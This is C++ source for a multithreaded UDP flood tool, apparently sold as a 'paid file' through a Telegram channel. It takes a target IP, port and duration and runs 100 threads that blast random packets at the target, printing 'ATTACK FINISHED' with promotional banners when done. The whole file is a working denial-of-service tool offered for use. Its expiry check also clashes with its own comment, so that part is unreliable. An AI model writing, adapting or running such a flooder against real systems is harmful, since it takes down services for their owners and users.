#include <iostream>
#include <string>
#include <vector>
#include <ctime>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>

#define PAYLOAD_SIZE 900    
#define RANDOM_STRING_SIZE 999  

struct AttackParams {
    std::string ip;
    int port;
    int duration;
};

void generate_random_string(std::string& buffer, size_t size) {
    const std::string charset = "abcdefghijklmnopqrstuvwxyz0123456789/";
    buffer.clear();
    for (size_t i = 0; i < size; ++i) {
        buffer += charset[rand() % charset.size()];
    }
}

void* send_udp_packets(void* arg) {
    AttackParams* params = reinterpret_cast<AttackParams*>(arg);
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    std::string random_string;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(nullptr);
    }

    fcntl(sock, F_SETFL, O_NONBLOCK);

    int size = 1024 * 1024; 
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &size, sizeof(size));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    if (inet_pton(AF_INET, params->ip.c_str(), &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        pthread_exit(nullptr);
    }

    for (size_t i = 0; i < PAYLOAD_SIZE; i += RANDOM_STRING_SIZE) {
        generate_random_string(random_string, RANDOM_STRING_SIZE);
        strncpy(payload + i, random_string.c_str(), RANDOM_STRING_SIZE);
    }

    // Define expiration time (31st December 2024, 23:59:59)
    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;  // tm_year is years since 1900
    expiration_tm.tm_mon = 1;  // December (0-based, so 11 is December)
    expiration_tm.tm_mday = 24;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min = 59;
    expiration_tm.tm_sec = 59;

    // Convert expiration time to time_t (seconds since Unix epoch)
    time_t expiration_time = mktime(&expiration_tm);
    if (expiration_time == -1) {
        std::cerr << "Error converting expiration time\n";
        pthread_exit(nullptr);
    }

    time_t start_time = time(nullptr);
    while (true) {
        // Exit if the current time surpasses expiration time
        if (time(nullptr) > expiration_time) {
            std::cout << "Expiration reached, stopping the attack!\n";
            break;
        }

        // Check if the duration time is over
        if (time(nullptr) - start_time >= params->duration) {
            break;
        }

        // Continue sending packets while within the allowed time
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(100); 
            } else {
                perror("Send failed");
                break;
            }
        }
    }

    close(sock);
    pthread_exit(nullptr);
}

int main(int argc, char *argv[]) {

    if (argc < 2) {
        std::cerr << "Usage: ./raja <ip> <port> <duration>\n";
        return 1;
    }

    const std::string default_ip = "127.0.0.1";
    int default_port = 80;
    int default_time = 60;

    AttackParams params;
    params.ip = argv[1];
    params.port = (argc >= 3) ? std::stoi(argv[2]) : default_port;
    params.duration = (argc >= 4) ? std::stoi(argv[3]) : default_time;

    std::cout << "Using values: IP = " << params.ip << ", Port = " << params.port 
              << ", Duration = " << params.duration << " seconds\n";

    srand(static_cast<unsigned int>(time(nullptr)));

    // Using a fixed thread count here (for example, 100 threads)
    int thread_count = 100;
    std::vector<pthread_t> threads(thread_count);
    for (int i = 0; i < thread_count; ++i) {
        if (pthread_create(&threads[i], nullptr, send_udp_packets, &params) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    for (int i = 0; i < thread_count; ++i) {
        pthread_join(threads[i], nullptr);
    }

    // VIP-style Finish Message
    std::cout << "\n";
    std::cout << "*********************************************************\n";
    std::cout << "*                                                           *\n";
    std::cout << "*                  ATTACK FINISHED                         *\n";
    std::cout << "*                                                              *\n";
    std::cout << "*  🔥🔥 ALONEBOY BOY SPECIAL PAID FILE🔥🔥            *\n";
    std::cout << "*           ✅ JOIN MY CHANNEL ✅                        *\n";
    std::cout << "*                                                              *\n";
    std::cout << "*                ⚡ GODxCHEATS ⚡                        *\n";
    std::cout << "*       ✨ https://t.me/+03wLVBPurPk2NWRl ✨            *\n";
    std::cout << "*                                                           *\n";
    std::cout << "*********************************************************\n";
    return 0;
}